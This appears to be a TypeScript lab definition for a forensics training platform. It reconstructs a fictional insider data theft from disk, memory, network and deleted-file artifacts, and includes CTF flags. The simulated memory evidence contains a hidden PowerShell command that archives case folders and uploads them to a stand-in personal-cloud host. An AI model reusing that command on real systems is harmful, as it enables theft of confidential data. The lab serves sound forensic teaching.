import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function forensicsWs(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'forensics-ws', user: 'root', root: dir(files) };
}

/** Forensics module capstone: one continuous five-flag DFIR case spanning disk artifacts, memory
 *  forensics, network artifacts, and deleted-file recovery — a full case file instead of five isolated
 *  single-artifact labs. Same file-review convention already established by every other Forensics lab
 *  on this platform (`forensics-advanced-pack.ts`, the disk/memory lesson modules). */
export const forensicsCapstoneLabs: LabScenario[] = [
  {
    id: 'forensics-capstone-insider-data-theft-full-case',
    title: 'Capstone: Full Case File — Reconstructing an Insider Data-Theft Incident',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      "A departing employee's laptop was seized at Alderwood Legal on their last day, after a client flagged " +
      'that confidential case files had surfaced with a competing firm. This is a full case file, not a single ' +
      'artifact: disk-level evidence (browser history, USB device history), a memory capture taken before the ' +
      'machine was powered off, network egress logs, and a deliberately-deleted file recovered from disk. Build ' +
      'the complete evidentiary timeline a real case report would need to stand up in front of opposing counsel.',
    objectives: [
      {
        text: 'Review disk/browser-history.txt and disk/usb-device-history.txt',
        why: 'Disk artifacts establish INTENT and OPPORTUNITY — a search for "how to bypass DLP" followed minutes later by a USB device connecting is exactly the kind of correlated timeline a case report needs, not just one artifact in isolation.',
      },
      {
        text: 'Review memory/volatility-pslist.txt and memory/volatility-cmdline.txt',
        why: "A memory capture taken before shutdown preserves exactly what disk forensics alone cannot: the live command line of a process that had already exited by the time the disk was imaged.",
      },
      {
        text: 'Review network/egress-firewall.log',
        why: 'Network egress logs corroborate the memory evidence independently — confirming the exfiltration script\'s upload actually left the network, not just that it was launched.',
      },
      {
        text: 'Review disk/recovered-deleted-file.txt',
        why: 'Deleting a file does not remove its data from disk immediately — recovering it is what turns "we suspect files were taken" into a specific, itemized list of exactly which ones.',
      },
      {
        text: 'Review case/timeline-summary.txt and capture the final flag',
        why: 'This is the actual deliverable of a real DFIR engagement: not four separate artifacts, but one correlated timeline tying disk, memory, and network evidence into a single, defensible narrative.',
      },
    ],
    hints: [
      'cat /disk/browser-history.txt',
      'cat /disk/usb-device-history.txt',
      'cat /memory/volatility-pslist.txt',
      'cat /memory/volatility-cmdline.txt',
      'cat /network/egress-firewall.log',
      'cat /disk/recovered-deleted-file.txt',
      'cat /case/timeline-summary.txt',
    ],
    totalFlags: 5,
    attacker: forensicsWs({
      disk: dir({
        'browser-history.txt': file(
          [
            '--- Chrome history export, last 48h before laptop return (partial) ---',
            '2026-05-28 16:02:11  "how to copy files without triggering DLP alert" — search',
            '2026-05-28 16:04:33  "personal cloud storage upload large files" — search',
            '2026-05-28 16:09:02  drive.example-personal-cloud.net — visited',
            'flag{browser_history_shows_dlp_bypass_research_and_personal_cloud_visit}',
            '',
          ].join('\n'),
        ),
        'usb-device-history.txt': file(
          [
            '--- Windows Setupapi USB device connection history (partial) ---',
            '2026-05-28 16:03:40  USB Mass Storage Device connected  VID_0951&PID_1666  Serial: E00E123A4B',
            '2026-05-28 16:11:52  USB Mass Storage Device disconnected  Serial: E00E123A4B',
            '--- an 8-minute USB session immediately after the DLP-bypass search — this exact device was never issued by IT ---',
            '',
          ].join('\n'),
        ),
        'recovered-deleted-file.txt': file(
          [
            '--- recovered from unallocated disk space, "case_files_manifest.txt" (deleted 2026-05-28 16:12:01) ---',
            'Smith_v_Halloway_case_files.zip',
            'Client_Chen_confidential_settlement_draft.docx',
            'Q2_2026_litigation_strategy_memo.pdf',
            '--- deletion did not overwrite the underlying disk sectors — full manifest recovered intact ---',
            'flag{deleted_file_recovery_reveals_exact_stolen_file_manifest}',
            '',
          ].join('\n'),
        ),
      }),
      memory: dir({
        'volatility-pslist.txt': file(
          [
            '--- volatility3 windows.pslist output against the pre-shutdown memory capture (partial) ---',
            'PID   PPID  ImageFileName        CreateTime',
            '4471  612   explorer.exe         2026-05-28 09:00:02',
            '8842  4471  powershell.exe       2026-05-28 16:09:15   <-- launched 76s after the personal-cloud site was visited',
            '',
          ].join('\n'),
        ),
        'volatility-cmdline.txt': file(
          [
            '--- volatility3 windows.cmdline output for PID 8842 ---',
            "PID 8842: powershell.exe -NoP -W Hidden -Command \"Compress-Archive -Path 'C:\\Cases\\*' -DestinationPath 'C:\\Users\\Public\\archive.zip'; " +
              "Invoke-WebRequest -Uri 'https://drive.example-personal-cloud.net/upload' -Method POST -InFile 'C:\\Users\\Public\\archive.zip'\"",
            '--- this exact command line only ever existed in memory — it never appeared in any on-disk PowerShell transcript ---',
            'flag{memory_capture_recovers_live_exfiltration_command_line}',
            '',
          ].join('\n'),
        ),
      }),
      network: dir({
        'egress-firewall.log': file(
          [
            '--- Alderwood Legal egress firewall log, workstation 10.10.230.14 (partial) ---',
            '2026-05-28 16:09:16  10.10.230.14  ALLOW  TCP  443  drive.example-personal-cloud.net  bytes_out=214880000  <-- ~205MB uploaded, matching the compressed case archive',
            '2026-05-28 16:09:52  10.10.230.14  ALLOW  TCP  443  drive.example-personal-cloud.net  transfer complete',
            '--- corroborates the memory-recovered command line: the archive did leave the network, not just get built ---',
            'flag{firewall_egress_log_corroborates_confidential_data_exfiltration}',
            '',
          ].join('\n'),
        ),
      }),
      case: dir({
        'timeline-summary.txt': file(
          [
            '--- Alderwood Legal incident timeline, correlated across disk, memory, and network evidence ---',
            '16:02:11  DLP-bypass research begins (disk: browser history)',
            '16:03:40  unauthorized USB device connected (disk: USB history)',
            '16:09:02  personal cloud storage site visited (disk: browser history)',
            '16:09:15  hidden PowerShell process launched (memory: pslist)',
            '16:09:16  205MB archive upload begins to that same site (network: firewall log)',
            '16:09:52  upload confirmed complete (network: firewall log)',
            '16:12:01  local case-files manifest deleted, immediately after upload (disk: recovered deleted file)',
            '--- four independent evidence sources, one 10-minute window, one fully corroborated narrative ---',
            'flag{four_source_correlated_timeline_confirms_insider_data_theft}',
            '',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
];
